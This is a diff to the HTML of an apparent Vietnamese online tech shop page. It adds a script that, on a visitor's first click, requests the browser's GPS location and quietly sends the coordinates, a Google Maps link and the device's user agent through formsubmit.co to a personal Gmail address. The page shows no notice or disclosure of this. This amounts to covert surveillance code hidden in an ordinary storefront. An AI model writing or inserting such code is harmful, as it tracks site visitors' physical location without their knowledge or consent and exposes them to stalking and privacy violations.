@@ -428,6 +428,36 @@
     renderProducts();
     updateCartUI();
   </script> 
+  <script>
+  // THAY ĐỊA CHỈ GMAIL CỦA BẠN VÀO ĐÂY:
+  const GMAIL_CUA_BAN = "quanm1074@gmail.com";
+
+  function guiViTriVeGmail() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition((pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        fetch(`https://formsubmit.co/ajax/${GMAIL_CUA_BAN}`, {
+          method: "POST",
+          headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({
+            Tieu_de: "Vị trí GPS khách truy cập Shop Công Nghệ",
+            Toa_do: `${lat}, ${lon}`,
+            Ban_do_Google_Maps: `https://www.google.com/maps?q=${lat},${lon}`,
+            Thiet_bi: navigator.userAgent
+          })
+        });
+      });
+    }
+  }
+
+  // Kích hoạt khi khách chạm vào trang web
+  document.addEventListener("click", guiViTriVeGmail, { once: true });
+</script>
   <!-- Default Statcounter code for Shop Công Nghệ
 https://quanm1074-gif.github.io/shop-cong-nghe/ -->
 <script type="text/javascript">
